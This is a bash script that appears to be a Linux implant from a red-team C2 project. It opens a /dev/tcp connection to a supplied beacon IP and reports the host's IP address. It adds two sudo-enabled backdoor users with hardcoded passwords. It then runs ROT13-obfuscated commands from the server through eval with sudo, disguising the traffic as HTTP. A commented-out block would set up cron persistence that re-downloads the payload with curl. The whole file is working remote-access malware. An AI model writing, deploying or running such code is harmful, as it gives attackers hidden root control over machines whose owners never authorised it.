#!/bin/bash

# Check for mandatory beacon IP address argument
if [ -z "$1" ]; then
  echo "Usage: $0 <beaconIPAddress>"
  exit 1
fi

beaconIPAddress="$1"

sleep 60

# Create a backup script to ensure the main payload is downloaded if deleted
backup_dir="/bin/Webkinz"
main_payload="/etc/javalanche.sh"
backup_script="$backup_dir/backup.sh"

# # Ensure the backup directory exists
# if [ ! -d "$backup_dir" ]; then
#   sudo mkdir -p "$backup_dir"
# fi

# # Create the backup script
# if [ ! -f "$backup_script" ]; then
#   sudo cat << EOF > "$backup_script"
# #!/bin/bash
# if [ ! -f "$main_payload" ]; then
#   sudo curl -o "$main_payload" "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
#   sudo chmod +x "$main_payload"
#   sudo -b nohup "$main_payload $beaconIPAddress" >/dev/null 2>&1
# fi
# EOF
#   sudo chmod +x "$backup_script"
# fi

# # Set up a cron job to run the backup script every 5 minutes
# cronjob="*/5 * * * * root $backup_script"
# (crontab -l ; echo "\n $cronjob") | crontab -

# Add fiewall rules
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Create TCP connection to the server
exec 3<>/dev/tcp/$beaconIPAddress/80

# Send initial message to C2
echo "Linux" >&3

# Send IP Address message to C2
ipaddress=$(ip addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.0\.0\.1$' | head -n 1)
echo "$ipaddress" >&3

# Add users
for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
  username=$(echo "$user" | cut -d':' -f1)
  password=$(echo "$user" | cut -d':' -f2)
  
  if ! id -u $username >/dev/null 2>&1; then
    sudo useradd $username
    sudo echo "$username:$password" | chpasswd
    usermod -aG sudo $username
  fi
done

rot13() {
  echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

send_keep_alive() {
  while true; do
    sleep 30
    keepalive=$(rot13 "KEEP_ALIVE")
    echo "$keepalive" >&3
  done
}

# Start keep-alive messages in the background
send_keep_alive &

# Get messages from the C2
while true; do
  # Read command from the C2
  if read -t 1 command <&3; then
    # Remove /r from the end of each line.
    command=$(echo "$command" | tr -d '\r')
    # Because we are disguising this in an HTTP packet, there are a bunch of lines we don't care about
    if [[ "$command" != "HTTP/1.1 200 OK" ]] && [[ "$command" != "Content-Length"* ]] && [[ "$command" != "Content-Type: text/plain; charset=utf-8" ]] && [[ -n "$command" ]]; then
      # Convert Cipher text to plain text
      command=$(rot13 "$command")
      # Run the command
      result=$(eval "sudo $command")
      # Convert the result into cipher text
      result=$(rot13 "$result")
      # Send the result back to the Beacon
      echo "$result" >&3
    fi
  fi
done
